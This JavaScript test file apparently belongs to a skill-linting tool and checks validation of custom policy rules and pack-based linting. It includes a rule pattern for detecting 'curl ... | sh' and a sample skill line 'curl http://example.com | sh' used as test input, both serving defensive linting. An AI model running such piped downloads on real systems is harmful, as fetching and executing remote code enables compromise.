import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { resolveRuntimeConfig } from "../src/config.js";
import { lintSkillContent } from "../src/skill-lint.js";

function setupConfig(json) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "skillpress-test-custom-policies-"));
  const configPath = path.join(root, "skillpress.config.json");
  fs.writeFileSync(configPath, JSON.stringify(json));
  return { root, configPath };
}

test("config validation accepts valid custom policy rules", () => {
  const { configPath } = setupConfig({
    custom_policy_rules: [
      {
        id: "no-curl-sh",
        pattern: "curl\\s+.*\\|\\s*sh",
        message: "Downloading and piping directly to shell is forbidden",
        severity: "error",
        pack: "security"
      },
      {
        id: "warning-style",
        pattern: "todo:",
        message: "Try to avoid todo comments in public skills",
        severity: "warning"
      }
    ],
    policy_packs: ["generic", "security"]
  });

  const config = resolveRuntimeConfig({ configPath });
  assert.equal(config.issues.length, 0, JSON.stringify(config.issues));
  assert.equal(config.config.custom_policy_rules.length, 2);
  assert.deepEqual(config.config.policy_packs, ["generic", "security"]);
});

test("config validation rejects invalid custom policy formats", () => {
  // Case 1: custom_policy_rules is not an array
  let setup = setupConfig({ custom_policy_rules: "invalid-type" });
  let config = resolveRuntimeConfig({ configPath: setup.configPath });
  assert.ok(config.issues.some((issue) => issue.code === "config_invalid_custom_policy_rules"));

  // Case 2: missing field
  setup = setupConfig({
    custom_policy_rules: [{ id: "test" }]
  });
  config = resolveRuntimeConfig({ configPath: setup.configPath });
  assert.ok(config.issues.some((issue) => issue.code === "config_invalid_custom_policy_rule_field"));

  // Case 3: duplicate ID
  setup = setupConfig({
    custom_policy_rules: [
      { id: "test", pattern: "a", message: "m" },
      { id: "test", pattern: "b", message: "m2" }
    ]
  });
  config = resolveRuntimeConfig({ configPath: setup.configPath });
  assert.ok(config.issues.some((issue) => issue.code === "config_invalid_custom_policy_rule_duplicate"));

  // Case 4: invalid regex
  setup = setupConfig({
    custom_policy_rules: [{ id: "test", pattern: "[a-", message: "m" }]
  });
  config = resolveRuntimeConfig({ configPath: setup.configPath });
  assert.ok(config.issues.some((issue) => issue.code === "config_invalid_custom_policy_rule_pattern"));

  // Case 5: invalid severity
  setup = setupConfig({
    custom_policy_rules: [{ id: "test", pattern: "a", message: "m", severity: "critical" }]
  });
  config = resolveRuntimeConfig({ configPath: setup.configPath });
  assert.ok(config.issues.some((issue) => issue.code === "config_invalid_custom_policy_rule_severity"));
});

test("linter runs custom policies when their pack is active", () => {
  const rules = [
    { id: "no-curl-sh", pattern: "curl\\s+.*\\|\\s*sh", message: "Direct shell piping is forbidden", severity: "error", pack: "security" },
    { id: "todo-warn", pattern: "todo:", message: "Avoid todo", severity: "warning", pack: "generic" }
  ];
  const content = "---\nname: test-skill\ndescription: A test skill\n---\n\ntodo: fix this.\ncurl http://example.com | sh";

  // Case 1: Only generic is active.
  let findings = lintSkillContent(content, {
    policyPacks: ["generic"],
    customPolicyRules: rules
  });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].code, "todo-warn");
  assert.equal(findings[0].severity, "warning");

  // Case 2: Both generic and security active.
  findings = lintSkillContent(content, {
    policyPacks: ["generic", "security"],
    customPolicyRules: rules
  });
  assert.equal(findings.length, 2);
  const codes = findings.map(f => f.code);
  assert.ok(codes.includes("todo-warn"));
  assert.ok(codes.includes("no-curl-sh"));
  assert.equal(findings.find(f => f.code === "no-curl-sh").severity, "error");
});
